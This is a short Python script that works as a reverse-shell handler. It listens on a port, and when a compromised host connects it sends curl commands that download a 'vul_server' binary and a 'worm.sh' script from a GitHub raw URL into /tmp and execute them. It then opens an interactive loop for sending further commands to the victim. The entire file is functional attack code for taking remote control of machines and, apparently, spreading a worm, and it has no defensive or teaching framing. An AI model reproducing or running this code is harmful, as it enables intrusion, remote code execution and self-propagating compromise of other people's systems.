import socket
import time
import subprocess

port = int(input("Enter port: "))

shell_commands = (
    "curl -o /tmp/vulserver https://raw.githubusercontent.com/paultheal1en/simpleworm/main/vul_server"
    "; sleep 3;"
    "curl -o /tmp/worm.sh https://raw.githubusercontent.com/paultheal1en/simpleworm/main/worm.sh"
    "; sleep 3; chmod +x /tmp/worm.sh; /tmp/worm.sh\n"
)

print(f"[+] Listening on port {port}...")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port))
    sock.listen(1)

    client_conn, client_addr = sock.accept()
    print(f"[+] Connection from {client_addr[0]}:{client_addr[1]}")
    with client_conn:
        print("[+] Sending commands to reverse shell...")
        client_conn.sendall(shell_commands.encode())

        print("[+] Switching to manual interactive mode. Press Ctrl+C to exit.")
        try:
            while True:
                cmd = input("> ")
                if not cmd.strip():
                    continue
                client_conn.sendall((cmd + "\n").encode())

                client_conn.settimeout(0.5)
                output = b""
                try:
                    while True:
                        chunk = client_conn.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                except socket.timeout:
                    pass

                print(output.decode(errors="ignore"))
        except KeyboardInterrupt:
            print("\n[!] Exited.")